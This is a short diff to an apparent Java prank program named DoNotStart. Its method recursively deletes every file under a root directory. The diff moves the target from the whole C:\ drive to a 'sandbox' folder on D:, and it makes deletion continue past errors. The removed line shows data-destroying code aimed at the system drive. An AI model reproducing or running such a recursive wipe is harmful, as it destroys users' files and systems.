@@ -14,7 +14,7 @@ public class DoNotStart {
         if (!s.equals(scan)) {
             return;
         }
-        File file = new File("C:\\");
+        File file = new File("D:\\沙箱");
         deleteFileAll(file);
     }
 
@@ -35,14 +35,14 @@ public class DoNotStart {
                 }
                 dir.add(file);
             } catch (Exception e) {
-                break;
+                continue;
             }
         } while (alf.size() > 0);
         while (dir.size() > 0) {
             try {
                 dir.removeLast().delete();
             } catch (Exception e) {
-                break;
+                continue;
             }
         }
     }
